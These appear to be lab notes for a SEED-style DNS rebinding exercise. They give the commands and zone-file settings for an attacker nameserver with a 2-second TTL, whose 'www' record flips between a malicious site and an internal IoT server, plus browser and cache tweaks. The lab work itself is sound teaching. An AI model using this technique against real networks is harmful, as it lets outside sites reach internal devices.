# DNS Rebinding Steps

## Reduce DNS Cache (Firefox)
- Open Firefox > `about:config` > network.dnsCacheExpiration = 10

## Config DNS (Local DNS)
- Access http://www.seediot32.com/ (Termómetro)
- `sudo nano /etc/resolvconf/resolv.conf.d/head`
- `sudo resolvconf -u `
- Access http://www.attacker32.com/ (Countdown)

## Attacker DNS 
`$ docker exec -it attacker-ns-10.9.0.153 bash`
  - `nano /etc/bind/zone_attacker32.com`

```
# cat etc/bind/zone_attacker32.com
$TTL 2
@       IN      SOA   ns.attacker32.com. admin.attacker32.com. (
                2008111001
                8H
                2H
                4W
                1D)

@       IN      NS    ns.attacker32.com.

@       IN      A     10.9.0.180
;www     IN      A     10.9.0.180
www     IN      A     192.168.60.80
ns      IN      A     10.9.0.153
*       IN      A     10.9.0.100
```

`$ rndc reload attacker32.com`
`$ service named restart`

## Local DNS
`$ docker exec -it local-dns-server-10.9.0.53 /bin/sh -c 'rndc flush'`

## Attack

- Change /etc/bind/zone_attacker32.com to load malicious website

```
...
www     IN      A     10.9.0.180
;www      IN      A     192.168.60.80
...
```

`$ rndc reload attacker32.com`

- Change /etc/bind/zone_attacker32.com to load IoT server

```
...
;www     IN      A     10.9.0.180
www      IN      A     192.168.60.80
...
```

`$ rndc reload attacker32.com`